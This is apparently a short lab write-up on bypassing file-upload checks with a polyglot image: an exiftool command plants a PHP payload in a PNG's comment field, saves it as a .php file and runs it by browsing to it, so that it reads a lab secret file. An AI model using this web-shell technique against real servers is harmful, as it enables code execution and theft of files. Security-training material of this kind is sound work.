# Summary

Another way of uploading php maliciuos file is using polygot web shells. Normal photo but with malicious code.

1) Create polgot photo with exiftool contains php malicous code in comment with following command:<br>
```bash
exiftool -Comment="<?php echo 'START' . file_get_contents('/home/carlos/secret') . ' END'; ?>" photo.png -o polygot.php
```
This adds your PHP payload to the image's Comment field, then saves the image with a `.php` extension
2) Then browse to location of file.
